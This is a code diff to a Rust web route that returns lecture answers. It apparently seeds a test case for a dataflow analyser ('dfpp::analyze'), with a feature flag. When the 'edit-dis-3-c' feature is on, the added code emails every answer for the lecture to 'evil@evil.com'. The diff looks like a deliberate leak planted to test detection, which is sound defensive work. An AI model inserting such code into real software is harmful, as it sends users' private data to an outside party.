@@ -161,6 +161,7 @@ fn get_answers(bg: &mut MySqlBackend, key: Either<u64, &str>) -> Vec<LectureAnsw
 }
 
 #[cfg_attr(feature = "edit-dis-3-a", dfpp::analyze)]
+#[cfg_attr(feature = "edit-dis-3-c", dfpp::analyze)]
 #[get("/<num>")]
 pub(crate) fn answers(
     _admin: Admin,
@@ -169,7 +170,26 @@ pub(crate) fn answers(
 ) -> Template {
     let mut bg = backend.lock().unwrap();
     let answers = get_answers(&mut bg, Either::Left(num as u64));
-    drop(bg);
+
+	#[cfg(feature = "edit-dis-3-c")]
+	email::send(
+		bg.log.clone(),
+		"".to_string(),
+		vec!["evil@evil.com".to_string()],
+		format!("{} questions", num),
+		format!(
+			"{}",
+			answers
+				.iter()
+				.map(|a| format!("Question {}:\n{}", a.id, a.answer))
+				.collect::<Vec<_>>()
+				.join("\n-----\n")
+		),
+	)
+	.expect("failed to send email");
+
+	drop(bg);
+
     let ctx = LectureAnswersContext {
         lec_id: num,
         answers: answers,
